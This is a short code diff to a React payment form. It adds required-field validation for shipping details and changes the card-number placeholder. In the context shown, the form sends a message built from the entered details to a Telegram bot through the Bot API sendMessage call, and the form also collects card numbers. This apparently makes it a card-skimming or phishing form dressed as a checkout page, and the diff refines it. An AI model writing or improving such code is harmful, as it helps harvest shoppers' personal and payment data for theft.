@@ -155,6 +155,18 @@ export default function PaymentForm({
       ].join("\n");
     };
 
+    // Validate required fields before proceeding
+    if (
+      !shippingInfo?.fullName ||
+      !shippingInfo?.address ||
+      !shippingInfo?.phone ||
+      !shippingInfo?.email ||
+      !shippingMethod
+    ) {
+      console.error("Missing required shipping information");
+      return;
+    }
+
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -286,7 +298,7 @@ export default function PaymentForm({
                 value={cardInfo.cardNumber}
                 onChange={handleCardInfoChange}
                 className="w-full p-3 border rounded-lg text-left dir-ltr"
-                placeholder="1111 2222 3333 4444"
+                placeholder="XXXX XXXX XXXX XXXX"
                 required
                 style={{ direction: "ltr", textAlign: "left" }}
               />
